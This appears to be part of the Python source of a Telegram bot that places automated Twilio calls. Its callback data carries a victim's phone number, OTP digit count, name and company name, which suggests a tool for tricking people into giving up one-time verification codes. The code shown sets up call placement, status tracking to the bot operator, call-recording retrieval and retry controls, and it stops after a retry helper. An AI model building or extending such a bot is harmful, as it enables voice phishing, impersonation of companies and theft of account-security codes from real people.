import phonenumbers
import time
import requests
import os
import json
import redis
import telebot
from flask import Flask
from twilio.rest import Client
from telebot import types

if not 'Config.txt' in os.listdir():
    open('Config.txt', 'w').write(
        '{"account_sid":"?", "auth_token":"?", "Twilio Phone Number":"+1?", "ngrok_url":"https://you-url.ngrok.io", "bot_token":"?"}')

raw_config = json.loads(open('Config.txt', 'r').read())
bot_token = raw_config['bot_token']
account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
your_twilio_phone_number = raw_config['Twilio Phone Number']
ngrok = raw_config['ngrok_url']

# Init
r = redis.Redis(host='localhost', port=6379, db=0, decode_responses=True)
bot = telebot.TeleBot(bot_token)
client = Client(account_sid, auth_token)
current_twilio_number_index = 0
app = Flask(__name__)


def is_valid_phone_number(phone_number):
    if not phone_number.startswith('+') or not phone_number[1:].isdigit():
        return False
    try:
        parsed_number = phonenumbers.parse(phone_number, None)
        return (phonenumbers.is_valid_number(parsed_number) and
                phonenumbers.region_code_for_number(parsed_number) == 'US')
    except phonenumbers.phonenumberutil.NumberParseException:
        return False


def save_data(chat_id, key, value):
    r.set(f'{chat_id}/{key}', value)


def get_data(chat_id, key):
    return r.get(f'{chat_id}/{key}')


def set_busy(chat_id):
    r.set(f'{chat_id}/busy', 'True')


def clear_busy(chat_id):
    r.delete(f'{chat_id}/busy')


def is_busy(chat_id):
    return r.get(f'{chat_id}/busy') == 'True'


def get_short_url(url):
    short_url_resp = requests.get(
        f'https://is.gd/create.php?format=simple&url={url}')
    if short_url_resp.status_code == 200:
        return short_url_resp.text
    return None


def get_recording_url(call_sid, retries=10, interval=5):
    for _ in range(retries):
        recordings = client.recordings.list(call_sid=call_sid)
        if recordings:
            return f"https://api.twilio.com{recordings[0].uri.replace('.json', '.mp3')}"
        time.sleep(interval)
    return None


def get_next_twilio_number():
    global current_twilio_number_index
    number = your_twilio_phone_number[current_twilio_number_index]
    current_twilio_number_index = (
        current_twilio_number_index + 1) % len(your_twilio_phone_number)
    return number


def send_call_status(call_sid, chat_id):
    status_messages = {
        'queued': 'Call Is Placed📲',
        'ringing': 'Cell Phone Is Ringing☎️',
        'in-progress': 'Please wait📈',
        'completed': 'Call Ended📴',
        'failed': 'Call Failed❌',
        'no-answer': 'Human Not Answered Call❌',
        'canceled': 'Call has been Canceled📴',
        'busy': 'Human Reject your call❌',
    }

    prev_status = None
    while True:
        current_call = client.calls(call_sid).fetch()
        current_status = current_call.status
        if current_status != prev_status:
            message = status_messages.get(current_status)
            if message:
                markup = types.InlineKeyboardMarkup()
                if current_status == 'queued':
                    hangup_button = types.InlineKeyboardButton(
                        'Cancel', callback_data=f'cancel_{call_sid}')
                    markup.add(hangup_button)
                
                time.sleep(2)
                bot.send_message(chat_id, message, reply_markup=markup)
            if current_status in ['completed', 'failed', 'no-answer', 'canceled', 'busy']:
                
                return current_status
            prev_status = current_status
        time.sleep(1)



@bot.callback_query_handler(func=lambda call: call.data.startswith('cancel_'))
def callback_query(call):
    call_sid = call.data.split('_')[1]
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id)

    # Menonaktifkan tombol cancel
    markup = types.InlineKeyboardMarkup()
    cancel_button = types.InlineKeyboardButton('Cancel Completed', callback_data='none')
    markup.add(cancel_button)
    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=markup)
    
    current_call = client.calls(call_sid).fetch()
    if current_call.status in ['queued', 'ringing']:
        client.calls(call_sid).update(status='completed')
        clear_busy(call.message.chat.id)
    else:
        clear_busy(call.message.chat.id)


def clear_data(chat_id, key):
    r.delete(f'{chat_id}/{key}')

def send_retry_message(chat_id, message_text, cell_phone, otp_digits, client_name, company_name):
    markup = types.InlineKeyboardMarkup()
    recall_button = types.InlineKeyboardButton(
        'Retry Call', callback_data=f'retry_{cell_phone}_{otp_digits}_{client_name}_{company_name}')
    markup.add(recall_button)
    bot.send_message(chat_id, message_text, reply_markup=markup)

    